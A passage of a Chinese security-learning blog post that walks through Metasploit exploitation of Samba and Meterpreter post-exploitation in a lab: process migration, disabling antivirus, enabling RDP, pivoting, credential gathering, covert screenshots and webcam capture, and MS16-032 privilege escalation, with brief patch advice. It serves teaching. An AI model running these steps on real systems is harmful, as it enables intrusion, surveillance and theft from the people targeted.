> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/whRbJ-cs3xh0qB8iPN6XTg)

最近开始学习网络安全和系统安全，接触到了很多新术语、新方法和新工具，作为一名初学者，感觉安全领域涉及的知识好广、好杂，但同时也非常有意思。所以我希望通过这 100 多篇网络安全文章，将 Web 渗透的相关工作、知识体系、学习路径和探索过程分享给大家。未知攻，焉知防，且看且珍惜。

**前文将带领大家了解 Metasploit 技术和基础知识。这篇文章将介绍后渗透 Meterpreter 技术的信息收集和权限提升，结合作者之前的漏洞利用及逆向经验总结。同时本文主要学习和参考了徐焱老师他们的《Web 安全攻防渗透测试实战指南》，在此感谢。**

文章目录：

*   **一. MSF 漏洞利用回顾**
    
*   **二. 后渗透攻击之信息收集**
    
    1. 进程迁移
    
    2. 系统命令
    
    3. 文件系统命令  
    
*   **三. 后渗透攻击之权限提升**
    
    1. 权限查询
    
    2. 利用 WMIC 实战 MS16-032 本地溢出漏洞
    
    3. 令牌窃取提权
    
    4.Hash 攻击提权  
    
*   **四. 总结**
    

娜璋 AI 安全之家将专注于 Python 和安全技术，主要分享 Web 渗透、系统安全、人工智能、大数据分析、图像识别、恶意代码检测、CVE 复现、威胁情报分析等文章。真心想把自己近十年的所学所做所感分享出来，与大家一起进步。

> 声明：本人坚决反对利用教学方法进行恶意攻击的行为，一切错误的行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解技术背后的原理，更好地进行安全防护。虽然作者是一名安全小白，但会保证每一篇文章都会很用心地撰写，希望基础性文章对你有所帮助，安全路上一起前行。
> 
> - https://github.com/eastmountyxz/NetworkSecuritySelf-study

一. MSF 漏洞利用回顾
=============

上一篇文章我们详细介绍了 Metasploit 的基础用法及漏洞利用过程，这篇文章将介绍后渗透相关的技术，包括信息收集、权限提升、移植漏洞和后门。在介绍这些知识之前，我们先简单回顾下 MSF 漏洞利用的基本流程。

第一步，扫描靶机 Windows XP 系统是否开启 445 端口。

*   nmap -sS 192.168.44.135
    

收集到目标主机相关信息后，为其选择正确的 Exploit 和合适的 Payload，然后发起攻击。作者这里选择 Samba 3.x 服务进行漏洞利用。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKxMTxplS1ibEzQC4GWNU4fcdISU6NIow9O3K7jyicCCLprtRibvdlJLPcA/640?wx_fmt=png)

第二步，打开 msfconsole。

*   msfconsole
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKJoTOHEaaDnnXBgLFgb5TF6Qvoicib678aQ9y443ElUbETAj9alcD4uRA/640?wx_fmt=png)

第三步，查询 Samba 的漏洞利用模块，并选择合适的漏洞利用模块。

*   search samba
    

> Samba 是在 Linux 和 UNIX 系统上实现 SMB（Server Message Block，信息服务块）协议的一款免费软件。SMB 是一种在局域网上共享文件和打印机的通信协议，它在局域网内使用 Linux 和 Windows 系统的机器之间提供文件及打印机等资源的共享服务。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKgaVtibFfgvTAicXc4E7Ku6ia3cfia6TyVGCrroyN8SES5HMofjF8RrMQ5A/640?wx_fmt=png)

第四步，利用漏洞模块。  
在 Samba 服务返回的漏洞利用模块列表中，我们选择 “Excellent” 最杰出且时间较新的漏洞，从而提高渗透成功率。

*   use exploit/multi/samba/usermap_script
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKY9T7CfsJVrRic2FnUDYicXzUGQVd1lLHtTmJdhoIrEvWHKiaw4PnB0ugA/640?wx_fmt=png)

第五步，查看该漏洞利用模块可供选择的攻击载荷模块。  
注意，因为目标是 Linux 机器，一定要选择 Linux 的攻击载荷。本文主要是回顾 MSF 漏洞攻击流程，后面会详细介绍真实的漏洞利用案例。

*   set payload cmd/unix/reverse
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKMyHPUpdhSAUAfHJWLc4u5UF6lIqLUwOwhaAV7QLBVk1iaG8aLibfDrjQ/640?wx_fmt=png)

第六步，设置漏洞利用信息。

*   受害主机 IP：set RHOST 192.168.44.135
    
*   攻击主机 IP：set LHOST 192.168.44.138
    
*   攻击端口：set RPORT 445
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK0Lw002aQ9hdY0yoh4HyGGaX5ibAxns7aYdTET7rRQKFkiby9adznibWtA/640?wx_fmt=png)

第七步，输入攻击命令 exploit 或 run。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKWhxHFmvKpyicTibVscu4SMwficHsmKAOOhpkChL12U96cJhOj6cK6Fg5A/640?wx_fmt=png)

MSF 发动攻击成功后会获取目标主机 Shell，可以看到攻击主机和目标主机之间建立了 Shell 连接。同时可能会出现错误 “Exploit completed, but no session was created”，需要注意目标主机版本信息，选择对应的攻击载荷及漏洞利用模块。建议读者多尝试各种 Exploit 和 Payload 的组合。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK7n3lH1IgB4ibVOHC85Ud4Og0ShoicgCnMn3yFjM9dXFVGkJv8FIP9ZVg/640?wx_fmt=png)

防御方法：

*   Samba 服务漏洞发生在 Samba3.0.20-25 版本，当使用非默认用户名映射脚本配置时，通过指定一个用户名包含 Shell 元字符，攻击者可以执行任意命令。建议将其升级到可防御的版本。
    
*   SMB 局域网上共享文件和打印机的通信协议会出现各种漏洞，建议关闭相关的端口及防火墙设置，即使修补最新漏洞。
    

二. 后渗透攻击之信息收集
=============

**成功对目标机攻击渗透后还可以做什么呢？**  
Metasploit 提供了一个非常强大的后渗透工具—— `Meterpreter`，该工具具有多重功能，使后续入侵变得更容易，获取目标机的 Meterpreter Shell 后，就进入了 Metasploit 最精彩的后渗透利用节点，后期渗透模块有 200 多个。

Meterpreter 具有以下优势。

*   纯内存工作模式，不需要对磁盘进行任何写入操作。
    
*   使用加密通信协议，而且可以同时与几个信道通信。
    
*   在被攻击进程内工作，不需要创建新的进程。
    
*   易于在多进程之间迁移。
    
*   平台通用，适用于 Windows、Linux、 BSD 系统， 并支持 Intel x86 和 Intel x64 平台。
    

这里以上篇文章介绍的 MS17-010 漏洞为例进行说明。  

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKrCBbX0njwADufkn9eibe4HwPVQu6erHXWTgktWKUc1tlH7JfTEG3VPg/640?wx_fmt=png)

同时，meterpreter 的 payload 是真强大，它可以实现太多太多的功能了。我们可以在 meterpreter 下面进行 help，查看相关用法。

*   Core Commands
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKVXic53quf2qCUibbpABbFBvbia0Jmpk65jwAaksnftUCUR4qEibrJ5icR4g/640?wx_fmt=png)

*   File System Commands
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKVZjvaK9yXwxO6IMpsw53icpTwsD9yykLDk0rhTbnQPfzPhRVAPLTq5w/640?wx_fmt=png)

*   Networking Commands
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKiazrgykZAPJqw7VOlAia7xm0fwIhD8icuFeGZv6180Dib7EibVV60z0QRkQ/640?wx_fmt=png)

*   User Interface Commands
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKtEZMz79G8Yoz747b0Hceo95yH3Qia9KqtibX1kPap4bwxs8uyGARSTSg/640?wx_fmt=png)

*   Webcam Commands & Other Commands
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKHbBiar7DPQicYkdXop12D7xkDUK0hyJhjxOMTuDljWBF3l8B7E7M0NJw/640?wx_fmt=png)

1. 进程迁移
-------

在刚获得 Meterpreter Shell 时，该 Shell 是极其脆弱和易受攻击的，例如攻击者可以利用浏览器漏洞攻陷目标机器，但攻击渗透后浏览器有可能被用户关闭。

所以第一步就是要移动这个 Shell，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。这样做使得渗透更难被检测到。

(1) 获取目标主机正在运行的进程

*   **`ps`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKgSGZ35eiauRT57eBavDKzLXMmcJoufw36Xrxy6dlDhFhJZv3rlib8vXg/640?wx_fmt=png)

这些进程与我们的目标主机如 XP 系统打开时对应的，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKQFoOferBpuHumicuu12wPSV9icrszyn6uIALp8vDSZibhS4sZy6NPqOFg/640?wx_fmt=png)

(2) 查看 Meterpreter Shell 的进程号。

*   **`getpid`**
    

发现 Meterpreter Shell 进程的 PID 为 524，Name 为 spoolsv.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK4fTUM3aDMZwibCEZtn28x7fqGV0GwceZWwBNpicRKgrNibxllI7Czek6Q/640?wx_fmt=png)

(3) 输入命令移动进程。  
输入 migrate 命令把 Shell 移动到 PID 为 1684 的 Explorer.exe 进程里，因为该进程是一个稳定的应用。

*   **`migrate 1684`**
    

> migrate 也是一个 post 模块，可以将 meterpreter 当前的进程移动到其他指定的进程中，这样做的好处是可以给 meterpreter 一个相对稳定的运行环境，同时可以很好的躲避杀软。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK4HQryscOHAib5Fmtc2qcOs9fZtaEZk4TeSMjQUolgBpLDZlawKiarkyg/640?wx_fmt=png)

渗透过程中可能会遇到问题，比如 “Error: Rex::TimeoutError : Operation timed out.”，这都需要我们学会独立解决。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKibfPq1FTPPgWYKgaBD4lM2a4N3umniazdFgvyibnxRLXTU3r50jC0Aiamg/640?wx_fmt=png)

完成进程迁移后，再次输入 getpid 命令查看 Meterpreter Shel 的进程号，发现 PID 已经变成了 2428，说明已经成功迁移到 Explorer.exe 进程里，原先 PID 为 1116 的进程会自动关闭，如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKFyD0ibTicEvrX2L7JvWGSJ5926ibzsX2MBtib4ASP6Wp1SVW43UxdGCKwg/640?wx_fmt=png)

(4) 使用自动迁移进程命令，系统会自动寻找合适的进程然后迁移。

*   **`run post/windows/manage/migrate`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKV05bAzricReNVB69boF9r5DSTRfXNIAP2pBicjt63rdRkPdc9RDPSrGQ/640?wx_fmt=png)

如下所示，系统已经把原来 PID 为 3292 的进程迁移到 6020。

```
meterpreter > run post/windows/manage/migrate[*] Running module against DX1XMSTMBBJR3FZ[*] Current server process: notepad.exe (3292)[*] Spawning notepad.exe process to migrate to[+] Migrating to 6020[+] Successfully migrated to process 6020
```

2. 系统命令
-------

获得了稳定的进程后，接下来收集系统信息。后续作者想通过 Python 自己实现这些功能，感觉挺有意思的。

(1) 查看目标主机的系统信息。  
通常会先输入 sysinfo 命令查看目标机的系统信息，例如操作系统和体系结构。

*   **`sysinfo`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK7Zz5LficIsne3vtmEFRJIHGEZBK0ALicFP2YxbANGx3EAFbByRNdSHWA/640?wx_fmt=png)

(2) 检查目标机是否运行在虚拟机上。

*   **`run post/windows/gather/checkvm`**
    

可以看到当前目标机正运行在一个 VMware 虚拟机上，接下来我们检查虚拟机最近是否运行。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKrOiaoNvW1OxxeQYpqSaBv903bK6P6Avicj03f6J4e2Kfq4riakFJtIicpw/640?wx_fmt=png)

(3) 查看目标机最近的运行时间。

*   **`idletime`**
    

看到目标机器正在运行且运行了 2 mins 49 secs。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKPLMcsjgNVvWVmbkcwd09MaL5HQ4VaJPzjEIgsVdia40Q1FXIAS04K7A/640?wx_fmt=png)

(4) 查看目标机完整的网络设置。

*   **`route`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKWsJbbkDyMfp4KKjZOBPjibOvzLc0GrTcdMnREojZicIJZbR8qUauOdYg/640?wx_fmt=png)

除此之外，可以输入 background 命令将当前会话放到后台，此命令适合在多个 Meterpreter 会话的场景下使用。

(5) 查看已经渗透成功的目标主机的用户名。

*   **`getuid`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKgDZ2v15JIacs2wF378Ec5M4icValD7uoR7YgsK3spOy0USUGBZoOjiag/640?wx_fmt=png)

(6) 关闭目标机操作系统杀毒软件。

*   **`run post/windows/manage/killav`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKqZyzYLSXzgb3841LqQSYaoxrwTx8Fk96qK4wu9PWicoJYcCShFnonHw/640?wx_fmt=png)

(7) 启动目标机的远程桌面协议，对应 3389 端口，后面我们会利用该端口。

*   **`run post/windows/manage/enable_rdp`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKicAHHVSNnaGGNia92r7hOn83ibcZOPGJVRsGrw8mibTiaIOCn8OwCicDj0cg/640?wx_fmt=png)

(8) 查看目标机的本地子网情况。

*   **`run post/windows/manage/autoroute`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKTCicic3u5LUBIOibtNLHOeeJxDicOVVoiaTZr5cun5KQzZ3AfrlrW8rpV2g/640?wx_fmt=png)  
可以通过添加路由借助被攻陷的主机对其他网络的主机发送攻击。同时可以添加路由信息。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKicu26nARUAFkRicmsO1z5RaYZ1qekOE725dSvDqZl5m0vcqC8iaF7tz6A/640?wx_fmt=png)

(9) 列举当前有多少用户登陆了目标机。

*   **`run post/windows/gather/`**
    
    **`enum_logged_on_users`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKiaphxPKHLyBNiaLM27sobVyAN34oPAibcfdFErCDkQIEu0ECblMORTBeQ/640?wx_fmt=png)

(10) 列举完了用户之后, 继续输入命令列举安装在目标机上的应用程序。

*   **`run post/windows/gather/`**
    
    **`enum_applications`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK6j5pUibI8CSelW6XuSocESFeW9ZxKgVib8lqr3ye110jYorKmSxHxTlQ/640?wx_fmt=png)

(11) 查看自动登陆的用户和密码。

*   **`run windows/gather/credentials/windows_autologin`**
    

可以看到当前没有抓到任何信息。此时就需要用到扩展插件 Espia，使用前要先输入 load espia 命令加载该插件，然后输入 screengrab 命令就可以抓取此时目标机的屏幕截图。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKYBS1ewTib51CwFiaqZxPEd4ibTqVjtcniaZia90FmS9xEweib5aOIx9B9lcA/640?wx_fmt=png)

(12) 加载该插件截屏。

*   **`load espia`**
    
*   **`screengrab`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKOTfr4xEibWUU35Aq3DTzXgfve9GicHaWLeibj32gJibHCMrkCOnDtkFDyA/640?wx_fmt=png)

另一个命令也可以达到同样的截屏效果。抓取成功后就生成了一个 jpeg 图片，保存在 root 目录下。

*   **`screenshot`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKyUaze69ZsAibCNA0VdU0B2LLTicCHFibTMpvpx4xY6icAJynnO6BYGKo7w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKapwlCldFv4qvgkG4KLYum1oH7jo2EphuSrkiaWXAicr1QK5GKaYjIdKA/640?wx_fmt=png)

打开图片如下图所示，目标主机成功被截图，是不是很可怕。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKmSXREfXDwibca7S2sId12wB4pwLBNbMs5hO0GrnHj1ialQ6MnwLibcN2g/640?wx_fmt=png)

(13) 查看目标机有没有摄像头。

*   **`webcam_list`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKULRSAfd87vKrQovcLKAHG1bammW6yAg4bwiaBWAwTVCqRfDRNZV9ESQ/640?wx_fmt=png)

(14) 打开目标摄像头，拍摄一张照片。

*   **`webcam_snap`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKf0KBv95HOZvbOvoOpk1IwQhASLn4tYniaWdw6WGaKCaiay5pmxOvsePA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK4YT0tyLCa4gZF9ZtjRvXJoAoJG5UeQp7vVEIp3kfkCicFAl6HX2DU4Q/640?wx_fmt=png)

(15) 开启直播模式。

*   **`webcam_stream`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK35Z3X3QvYOTREKNqlyQQ04U5XTekDObQU6pJNTXZbbSgdSc6pBeWww/640?wx_fmt=png)

(16) 进入目标机 shell。

*   **`shell`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKBocgPV7EhwpChFibibsjsamFPEBbvrJeXl4DsG2h725bsicNqL8NAutKg/640?wx_fmt=png)

(17) 停止 shell 会话并返回 meterpreter。

*   **`exit`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK7Sf7cfL8uD9h52koNVN4BFic98MmAw1UmD8GQS2l3IXcLp9Ak8T7eUw/640?wx_fmt=png)

3. 文件系统命令
---------

Meterpreter 也支持各种文件系统命令，用于搜索文件并执行各种任务，例如搜索文件、下载文件及切换目录等，相对来说操作比较简单。常用的文件系统命令如下所示。

(1) 查看当前处于目标机的目录。

*   **`pwd或getwd`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKxw1Y3PxPOXtO9iaPKMBnfYibFgDlL2Eb070oSRJW0WSkUHL46jhshCrg/640?wx_fmt=png)

(2) 查看当前处于本地的哪个目录。

*   **`getlwd`**
    

(3) 列出当前目录中的所有文件。

*   **`ls`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKIxOKQfic5rSppEnSuxuR4Yel4uvCPYe9QQu7KjHcd1AjsnibkxqSFPUA/640?wx_fmt=png)

(4) 切换目录。

*   **`cd`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKYZMIB8ubukshHUyQULjnXUaFm6MfWIv3zF89PksSSQMLVicw7qMbuibg/640?wx_fmt=png)

(5) 搜索 C 盘中所有以 ".txt" 为扩展名的文件。

*   **`search -f *.txt -d c:\\`**
    

其中 - f 参数用于指定搜索文件模式，-d 参数用于指定在哪个目录下进行搜索，如图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKua9Ok5fdJ4BhOJLqUGMSl2aoFnpIib10dyh9ibXhQbFbfm8DJMbfauRA/640?wx_fmt=png)

(6) 下载目标机 C 盘的 test.txt 文件到攻击机 root 下。

*   **`download c:\\test\\test.txt /root`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKEUrC97BINFmgyS6ub1xkWicBU3ytEVofR0CcBrn4SWJWvMh8fhtuSdw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKCQ2WPj0QicNR2iauSDBmYzexT00mUt7aEsibhXwaavtIicXbgJInt2h5yA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK4WHdDt4N6TAHCL6Mria3yg3llJECOFZDe6G1sm47z1kibu0Lv2HouClQ/640?wx_fmt=png)

(7) 上传攻击机 root 目录下的 test.txt 文件到目标机 C 盘下。

*   **`upload /root/test.txt c:\\`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK6bCHr2LNlA9YT9Tnia0MiaHxDwAzsibHRSib2SguLKconjOUxPf98HibLpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKgwJ6kmHvm2M2xAiaYxU0nic9jgmvUsEviaOxW3nmXydDiajw69POHVrvxw/640?wx_fmt=png)

三. 后渗透攻击之权限提升
=============

1. 权限查询
-------

在渗透过程中很有可能只获得了一个系统的 Guest 或 User 权限。低的权限级别将使我们受到很多的限制，在实施横向渗透或者提权攻击时将很困难。

在主机上如果没有管理员权限，就无法进行获取 Hash、安装软件、修改防火墙规则和修改注册表等各种操作，所以必须将访问权限从 Guset 提升到 User，再到 Administrator，最后到 System 级别。

渗透的最终目的是获取服务器的最高权限，即 Windows 操作系统中管理员账号的权限，或 Linux 操作系统中 root 账户的权限。提升权限的方式分为以下两类。

*   **纵向提权：**低权限角色获得高权限角色的权限。例如，一个 WebShell 权限通过提权之后拥有了管理员的权限，那么这种提权就是纵向提权，也称作权限升级。
    
*   **横向提权：**获取同级别角色的权限。例如，通过已经攻破的系统 A 获取了系统 B 的权限，那么这种提权就属于横向提权。
    

所以在成功获取目标机 Meterpreter Shell 后，我们要知道现在已经拥有了什么权限。

(1) 查看当前权限。  
在 Meterpreter Shell 下输入 shell 命令进入目标机的 CMD 命令行，接着输入 whoami /groups 命令查看我们当前的权限。

*   **`whoami`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKmC2icIcq2ic6sLEQKZFXoMiccMBtUtLTMHofKAxEvMw6FQWiacPe6FlnuA/640?wx_fmt=png)

注意，如果提示 whoami 不是内部命令，则需要将 whoami.exe 复制到 System32 目录。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKuBO090YocicCygXJhhxV1w4XdqQTicrlGAibw1ZwBXvNhlAbzToOfEIcQ/640?wx_fmt=png)

查看我们当前的权限。

*   **`whoami /groups`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK32iaql8hicR0ysj5wsWghVm7frEKthicW1ord3d2QjLkcD0Xa6MkhXZhA/640?wx_fmt=png)

(2) 查看用户已获得的权限。  
作者这里使用 MS17-010 漏洞提权，已经是系统管理员权限了。

*   **`getuid`**
    

通过 getsystem 命令可以尝试提权。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK5ClHLHXyuLvqrptMYqukLML3DycZnt0mCp4uP3OhkkkticU5T8micSHQ/640?wx_fmt=png)

(3) 查看系统的已打补。  
传统的方法是在目标机的 CMD 命令行下输入 systeminfo 命令，或者通过查询 C:\windows \ 里留下的补丁号 ".Iog" 查看目标机大概打了哪些补丁，如图所示。

*   **`systeminfo`**
    

可以看到目标机只安装了 3 个修补程序。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKBqXicbOqKH5Pc9pOyc9VnMZs7Rvk7ibmm6PJMgPEEZmTzeTe2DUxaNPA/640?wx_fmt=png)

meterpreter 命令如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKK9DkYyaJs7RHOS0UpCXiaVAOATLWPdOObJskqfd1mKw0oyZcLBSZDLA/640?wx_fmt=png)

(4) 利用 WMIC 命令列出已安装的补丁。

*   **`Wmic qfe get Caption,Description,`**
    
    **`HotFixID,InstalledOn`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKwhd3RLYoU6xSb1Y1DzuQhl8XwX8xXb54pe8HSoW2a1Mn2SwTUic7PRQ/640?wx_fmt=png)

注意，作者这里没有显示详细信息，而徐老师他们显示详细信息如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKpBoVUnK5FyFGfgs4bcvZYkYbSQInAbPqCICyajyiadOduufyz33o5LA/640?wx_fmt=png)

可以看到目标机只打了 3 个补丁，要注意这些输出的结果是不能被直接利用的，使用的方式是去找提权的 EXP，然后将系统已经安装的补丁编号与提权的 EXP 编号进行对比。

比如 KiTrap0D (KB979682) 、MS11-011 (KB2393802) 、MS11-080(KB2592799)，然后使用没有编号的 EXP 进行提权。

因为虚拟机不怎么打补丁，所以我们可以使用很多 EXP 来提权，这里就用最新的 MS16-032 来尝试提权，对应的编号是 KB3139914。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK4d2lnc8A8URsicEBKR5tO6lmdKlkU7w06lnjIRygBzRFHibN1QTia61fg/640?wx_fmt=png)

> WMIC 是 Windows Management Instrumentation Command-line 的简称，它是一款命令行管理工具，提供了从命令行接口到批命令脚本执行系统管理的支持，可以说是 Windows 平台下最有用的命令行工具。使用 WMIC 我们不但可以管理本地计算机，还可以管理同一域内的所有远程计算机（需要必要的权限），而被管理的远程计算机不必事先安装 WMIC。  
> 需要注意的是，在 Windows XP 下，低权限用户是不能使用 WMIC 命令的，但是在 Windows 7 系统和 Windows 8 系统下，低权限用户可以使用 WMIC 且不用更改任何设置。
> 
> WMIC 在信息收集和后渗透测试阶段非常实用，可以调取查看目标机的进程、服务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装补丁、启动项、已安装的软件、操作系统的相关信息和时区等。

2. 利用 WMIC 实战 MS16-032 本地溢出漏洞
-----------------------------

下面我们就利用本地溢出漏洞来提高权限，也就是说通过运行些现成的、能造成溢出漏洞的 Exploit，把用户从 User 组或其他系统用户组中提升到 Administrator 组或 root。

溢出漏洞就像往杯子里装水，水多了杯子装不进去，里面的水就会溢出来。而计算机有个地方叫缓存区，程序的缓存区长度是事先被设定好的，如果用户输入的数据超过了这个缓存区的长度，那么这个程序就会溢出。

(1) 接下来准备提权，需要先把 Meterpreter 会话转为后台执行，然后搜索 MS16-032，如下图所示。

*   **`search ms16-032`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKZHLXX6KOze0eEbYTzMKP5xicQjvVCG8qyokvgSJ7UBpOoXfaSlpaNcw/640?wx_fmt=png)

(2) 指定 session 完成提权操作。

*   **`use windows/local/ms16_032_secondary_logon_handle_privesc`**
    
*   **`set session 1`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKNcEISzjZmTee8V77eJoqLRL9HGBCAL7BPURIffGJUGSQ5v8zvibEZQQ/640?wx_fmt=png)

(3) 实现攻击。

*   **`run`**
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK7SuRPIDhVrpEl2uSseAVZP9KtOnPb6oykrnDSuW9jX0pxb4UzvpZ7g/640?wx_fmt=png)

注意，如果搜索不到最新的 Exploit，可以输入 msfupdate 命令进行升级，获取最新的 Exploit 模块、攻击载荷，或者手动添加相应漏洞 EXP 。但是作者的始终没有响应，真实的运行结果是将权限提升为 System 级别。

防御方式：

*   该漏洞的安全补丁编号为 KB3139914，我们只需要安装此补丁即可。为了方便提权，下面给出部分补丁编号。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgK5uicUm25ibcW3GIKzicmA8zRIquDicRcs1g5SqiaAcLWAHa0AFVwCz0PibgA/640?wx_fmt=png)

微软也会定期给出对应的方法，比如：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRNUxpPHicL2yuT72bmBzgtgKsJmMR8OSajzZIFiaG0ib8Bzy4p9v0LZb0jFkibCiaISFChkibtE36zv2D9g/640?wx_fmt=png)

3. 令牌窃取提权
---------

